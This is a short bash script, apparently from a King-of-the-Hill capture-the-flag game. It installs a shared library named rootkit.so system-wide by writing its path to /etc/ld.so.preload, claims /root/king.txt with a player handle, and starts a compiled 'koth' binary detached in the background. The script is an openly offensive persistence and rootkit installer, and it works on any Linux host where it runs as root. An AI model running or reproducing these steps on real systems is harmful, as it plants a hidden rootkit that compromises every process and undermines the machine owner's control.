#!/bin/bash

# gcc -shared -o rootkit.so -fPIC rootkit.c -ldl
make arko
sudo cp ./rootkit2.so /usr/local/lib/rootkit.so
echo /usr/local/lib/rootkit.so > /etc/ld.so.preload
echo profxadke > /root/king.txt
# gcc -static kothv4.c -o koth.o 2>/dev/null
./koth.o & disown